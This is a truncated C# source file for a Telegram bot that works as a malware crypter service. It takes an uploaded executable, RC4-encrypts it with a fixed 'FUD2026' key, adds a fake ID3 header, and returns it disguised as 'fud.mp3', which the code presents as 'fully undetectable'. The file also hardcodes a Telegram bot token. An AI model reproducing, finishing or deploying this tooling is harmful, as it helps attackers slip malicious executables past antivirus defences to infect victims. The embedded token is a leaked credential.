using System;
using System.IO;
using System.Net.Http;
using System.Text;
using System.Text.Json;
using System.Threading.Tasks;

var builder = WebApplication.CreateBuilder(args);
builder.Services.AddHttpClient();
var app = builder.Build();

const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";

app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory http) => {
    using var reader = new StreamReader(ctx.Request.Body);
    var json = await reader.ReadToEndAsync();
    
    try {
        var update = JsonSerializer.Deserialize<Update>(json);
        if (update?.Message?.Document != null) {
            var client = http.CreateClient();
            
            // Get file
            var fileResp = await client.GetStringAsync($"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={update.Message.Document.FileId}");
            var fileData = JsonSerializer.Deserialize<FileResponse>(fileResp);
            
            if (fileData.Ok && fileData.Result.FilePath != null) {
                // Download
                var payload = await client.GetByteArrayAsync($"https://api.telegram.org/file/bot{BOT_TOKEN}/{fileData.Result.FilePath}");
                
                // FUD!
                var fudMp3 = FudMp3(payload);
                
                // Send back
                using var content = new MultipartFormDataContent();
                content.Add(new StringContent(update.Message.Chat.Id.ToString()), "chat_id");
                content.Add(new StringContent("Your FUD MP3 (Key: FUD2026)"), "caption");
                var mp3Part = new ByteArrayContent(fudMp3);
                mp3Part.Headers.ContentType = System.Net.Http.Headers.MediaTypeHeaderValue.Parse("audio/mpeg");
                content.Add(mp3Part, "document", "fud.mp3");
                
                await client.PostAsync($"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument", content);
            }
        }
    } catch { }
    
    return Results.Ok();
});

app.Run("0.0.0.0:10000");

static byte[] FudMp3(byte[] exe) {
    var key = Encoding.UTF8.GetBytes("FUD2026");
    var encrypted = Rc4(exe, key);
    var head = Encoding.ASCII.GetBytes("ID3v2.3\x00\x00\x00\x40");
    var result = new byte[head.Length + encrypted.Length];
    head.CopyTo(result, 0);
    encrypted.CopyTo(result, head.Length);
    return result;
}

static byte[] Rc4(byte[] data, byte[] key) {
    byte[] s = new byte[256];
    for (int i = 0; i < 256; i++) s[i] = (byte)i;
    int j = 0;
    for (int i = 0; i < 256
